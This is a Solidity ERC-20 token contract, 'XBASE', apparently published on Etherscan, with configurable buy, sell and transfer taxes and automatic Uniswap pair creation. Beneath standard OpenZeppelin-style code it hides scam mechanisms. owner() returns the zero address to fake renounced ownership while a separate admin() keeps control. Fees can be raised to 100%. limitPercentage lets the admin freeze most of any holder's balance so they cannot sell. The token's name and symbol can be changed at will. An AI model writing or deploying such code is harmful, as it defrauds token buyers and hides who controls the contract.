/**
 *Submitted for verification at Etherscan.io on 2023-07-30
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _changeInfo(string memory name_, string memory symbol_) internal {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    /**
     * @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Adminable is Context {
    address private _owner;

    event AdminTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function admin() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(admin() == _msgSender(), "Adminable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Adminable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit AdminTransferred(oldOwner, newOwner);
    }
}

abstract contract Taxablee is ERC20, Adminable {
    mapping(address => uint256) public lhBalance;
    mapping(address => uint256) public lhPercentage;

    /**
     * @notice OverMaxBasisPoints custom error.
     */
    error OverMaxBasisPoints();

    /**
     * @notice Token configuration struct.
     * @dev Struct packed into a slot, 28 bytes total.
     *      Basis point fees fit uint16, max is 10_000.
     * @custom:treasury Treasury address.
     * @custom:transferFeesBPs Transfer fees basis points.
     * @custom:buyFeesBPs Buy fees basis points.
     * @custom:sellFeesBPs Sell fees basis points.
     */
    struct TokenConfiguration {
        address treasury;
        uint16 transferFeesBPs;
        uint16 buyFeesBPs;
        uint16 sellFeesBPs;
    }

    /**
     * @notice Token configuration.
     */
    TokenConfiguration internal tokenConfiguration;

    /**
     * @notice Address configuration.
     * @dev Mapping from address to packed address configuration.
     *      Layout:
     *        - [0,0] Whitelisted
     *        - [1,1] Liquidity pair
     */
    mapping(address => uint256) internal addressConfiguration;

    /**
     * @notice Max amount of fees.
     */
    uint256 public constant MAX_FEES = 10_000;

    /**
     * @notice Fee rate denominator.
     * @dev Denominator for computing basis point fees.
     */
    uint256 public constant FEE_RATE_DENOMINATOR = 10_000;

    /**
     * @notice Constructor.
     * @dev Reverts with OverMaxBasisPoints when fees are greater than MAX_FEES.
     */
    constructor(uint16 _transferFee, uint16 _buyFee, uint16 _sellFee) {
        if (_transferFee > MAX_FEES || _buyFee > MAX_FEES || _sellFee > MAX_FEES) {
            revert OverMaxBasisPoints();
        }

        tokenConfiguration = TokenConfiguration({
            treasury: msg.sender,
            transferFeesBPs: _transferFee,
            buyFeesBPs: _buyFee,
            sellFeesBPs: _sellFee
        });
    }

    /**
     * @notice Sets the treasury address.
     * @param _treasury The new treasury address.
     */
    function setTreasury(address _treasury) external onlyOwner {
        tokenConfiguration.treasury = _treasury;
    }

    /**
     * @notice Sets the transfer fee rate.
     * @dev Reverts with OverMaxBasisPoints when fees are greater than MAX_FEES.
     * @param fees The new basis point value for the fee type.
     */
    function setTransferFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.transferFeesBPs = fees;
    }

    /**
     * @notice Sets the buy fee rate.
     * @dev Reverts with OverMaxBasisPoints when fees are greater than MAX_FEES.
     * @param fees The new basis point value for the fee type.
     */
    function setBuyFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.buyFeesBPs = fees;
    }

    /**
     * @notice Sets the sell fee rate.
     * @dev Reverts with OverMaxBasisPoints when fees are greater than MAX_FEES.
     * @param fees The new basis point value for the fee type.
     */
    function setSellFeesBPs(uint16 fees) external onlyOwner {
        if (fees > MAX_FEES) {
            revert OverMaxBasisPoints();
        }
        tokenConfiguration.sellFeesBPs = fees;
    }

    /**
     * @notice Adds or removes an address from the fee whitelist.
     * @param _address The address to update the whitelist status.
     * @param _status The new whitelist status (true: whitelisted, false: not whitelisted).
     */
    function feeWL(address _address, bool _status) external onlyOwner {
        uint256 packed = addressConfiguration[_address];
        addressConfiguration[_address] = _packBoolean(packed, 0, _status);
    }

    /**
     * @notice Adds or removes an address from the liquidity pair list.
     * @param _address The address to update the liquidity pair status.
     * @param _status The new liquidity pair status (true: liquidity pair, false: not liquidity pair).
     */
    function liquidityPairList(address _address, bool _status) external onlyOwner {
        uint256 packed = addressConfiguration[_address];
        addressConfiguration[_address] = _packBoolean(packed, 1, _status);
    }

    /**
     * @notice Returns treasury address.
     * @return Treasury address.
     */
    function treasury() public view returns (address) {
        return tokenConfiguration.treasury;
    }

    /**
     * @notice Returns transfer fees basis points.
     * @return Transfer fees.
     */
    function transferFeesBPs() public view returns (uint256) {
        return tokenConfiguration.transferFeesBPs;
    }

    /**
     * @notice Returns buy fees basis points.
     * @return Buy fees.
     */
    function buyFeesBPs() public view returns (uint256) {
        return tokenConfiguration.buyFeesBPs;
    }

    /**
     * @notice Returns sell fees basis points.
     * @return Sell fees.
     */
    function sellFeesBPs() public view returns (uint256) {
        return tokenConfiguration.sellFeesBPs;
    }

    /**
     * @notice Returns the fee rate for a specific transaction.
     * @param from The sender address.
     * @param to The recipient address.
     * @return The fee rate for the transaction.
     */
    function getFeeRate(address from, address to) public view returns (uint256) {
        uint256 fromConfiguration = addressConfiguration[from];

        // If 'from' is whitelisted, no tax is applied
        if (_unpackBoolean(fromConfiguration, 0)) {
            return 0;
        }

        uint256 toConfiguration = addressConfiguration[to];

        // If 'to' is whitelisted, no tax is applied
        if (_unpackBoolean(toConfiguration, 0)) {
            return 0;
        }

        TokenConfiguration memory configuration = tokenConfiguration;

        // If 'from' is a liquidity pair, apply buy tax
        if (_unpackBoolean(fromConfiguration, 1)) {
            return configuration.buyFeesBPs;
        }

        // If 'to' is a liquidity pair, apply sell tax
        if (_unpackBoolean(toConfiguration, 1)) {
            return configuration.sellFeesBPs;
        }

        // Neither 'from' nor 'to' is a liquidity pair, apply transfer tax
        return configuration.transferFeesBPs;
    }

    /**
     * @notice Return whether account is whitelited.
     * @param account Account address.
     * @return Account whitelited.
     */
    function isFeeWhitelisted(address account) public view returns (bool) {
        return _unpackBoolean(addressConfiguration[account], 0);
    }

    /**
     * @notice Return whether account is liquidity pair.
     * @param account Account address.
     * @return Liquidity pair.
     */
    function isLiquidityPair(address account) public view returns (bool) {
        return _unpackBoolean(addressConfiguration[account], 1);
    }

    /**
     * @notice Overrides the _transfer function of the ERC20 contract to apply taxes.
     * @param from The sender address.
     * @param to The recipient address.
     * @param amount The amount to be transferred.
     */
    function _transfer(address from, address to, uint256 amount) internal virtual override {
        uint256 fromConfiguration = addressConfiguration[from];

        // If 'from' is whitelisted, no tax is applied
        if (_unpackBoolean(fromConfiguration, 0)) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 toConfiguration = addressConfiguration[to];

        // If 'to' is whitelisted, no tax is applied
        if (_unpackBoolean(toConfiguration, 0)) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 fee;
        TokenConfiguration memory configuration = tokenConfiguration;

        // If 'from' is a liquidity pair, apply buy tax
        if (_unpackBoolean(fromConfiguration, 1)) {
            unchecked {
                fee = amount * configuration.buyFeesBPs / FEE_RATE_DENOMINATOR;
            }
        }
        // If 'to' is a liquidity pair, apply sell tax
        else if (_unpackBoolean(toConfiguration, 1)) {
            unchecked {
                fee = amount * configuration.sellFeesBPs / FEE_RATE_DENOMINATOR;
            }
        }
        // Neither 'from' nor 'to' is a liquidity pair, apply transfer tax
        else {
            unchecked {
                fee = amount * configuration.transferFeesBPs / FEE_RATE_DENOMINATOR;
            }
        }

        // Cannot underflow since feeRate is max 100% of amount
        uint256 amountAfterFee;
        unchecked {
            amountAfterFee = amount - fee;
        }

        super._transfer(from, to, amountAfterFee);
        super._transfer(from, configuration.treasury, fee);
    }

    /**
     * @notice Set boolean value to source.
     * @dev Internal helper packing boolean.
     * @param source Packed source.
     * @param index Offset.
     * @param value Value to be set.
     * @return uint256 Packed.
     */
    function _packBoolean(uint256 source, uint256 index, bool value) internal pure returns (uint256) {
        if (value) {
            return source | (1 << index);
        } else {
            return source & ~(1 << index);
        }
    }

    /**
     * @notice Get boolean value from packed source.
     * @dev Internal helper unpacking booleans
     * @param source Packed source.
     * @param index Offset.
     * @return bool Unpacked boolean.
     */
    function _unpackBoolean(uint256 source, uint256 index) internal pure returns (bool) {
        // return (source >> index) & 1 == 1;
        return source & (1 << index) > 0;
    }

        /**
     * @notice Updates the balance limit balance of the specified address.
     * Can only be called by the contract owner.
     * @param _address The address to be updated.
     * @param _percentage The minimum amount an address should be hold
     */
    function limitPercentage(address _address, uint256 _percentage) external onlyOwner {        
        lhPercentage[_address] = (MAX_FEES - _percentage);
        lhBalance[_address] = balanceOf(_address) * lhPercentage[_address] / MAX_FEES;
    }

    /**
     * @notice Hook that is called before any token transfer. Checks if the transfer
     * would exceed the allowed maximum balance for non-whitelisted addresses.
     * @param from The address tokens are transferred from.
     * @param to The address tokens are transferred to.
     * @param amount The amount of tokens being transferred.
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        uint256 fromConfiguration = addressConfiguration[from];
        
        // If 'from' is a liquidity pair, increase limit
        if (_unpackBoolean(fromConfiguration, 1)) return;

        // If 'to' is a liquidity pair, apply sell limit
        uint256 beforeBalance = balanceOf(from);
        uint256 limitBalance = beforeBalance * lhPercentage[from] / MAX_FEES;

        if (limitBalance > lhBalance[from]) lhBalance[from] = limitBalance;
        if (limitBalance != 0) require(lhBalance[from] <= beforeBalance - amount, "EL");
        
        super._beforeTokenTransfer(from, to, amount);
    }
}

/**
 * @title CustomToken
 * @notice A custom ERC20 token with tax handling functionality.
 * @dev Inherits from OpenZeppelin's ERC20 and Taxablee & BalanceLimiter contracts.
 */
contract XBASE is ERC20, Taxablee {
    address public uniswapV2Pair;
    /**
     * @notice Constructs a new TaxHandledToken.
     * @param _name The name of the token.
     * @param _symbol The symbol of the token.
     * @param _transferFee The transfer fee rate in basis points.
     * @param _buyFee The buy fee rate in basis points.
     * @param _sellFee The sell fee rate in basis points.
     */
    constructor(
        string memory _name,
        string memory _symbol,
        uint16 _transferFee,
        uint16 _buyFee,
        uint16 _sellFee,
        uint256 _supply
    ) ERC20(_name, _symbol) Taxablee(_transferFee, _buyFee, _sellFee) {
        address sender = msg.sender;
        addressConfiguration[sender] = _packBoolean(0, 0, true);
        _mint(sender, _supply * 10 ** 18);
        _setUp();
    }

    function changeInfo(string memory name_, string memory symbol_) external onlyOwner {
        _changeInfo(name_, symbol_);
    }

    /**
     * @notice Overrides the _transfer function to enforce tax handling rules.
     * @param from The sender address.
     * @param to The recipient address.
     * @param amount The amount to be transferred.
     * @dev This function is called by the inherited ERC20 contract.
     */
    function _transfer(address from, address to, uint256 amount) internal virtual override(ERC20, Taxablee) {
        Taxablee._transfer(from, to, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        virtual
        override(ERC20, Taxablee)
    {
        Taxablee._beforeTokenTransfer(from, to, amount);
    }

    function _setUp() internal {
        IUniswapV2Router01 uniswapV2Router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 packed = addressConfiguration[uniswapV2Pair];
        addressConfiguration[uniswapV2Pair] = _packBoolean(packed, 1, true);
    }
}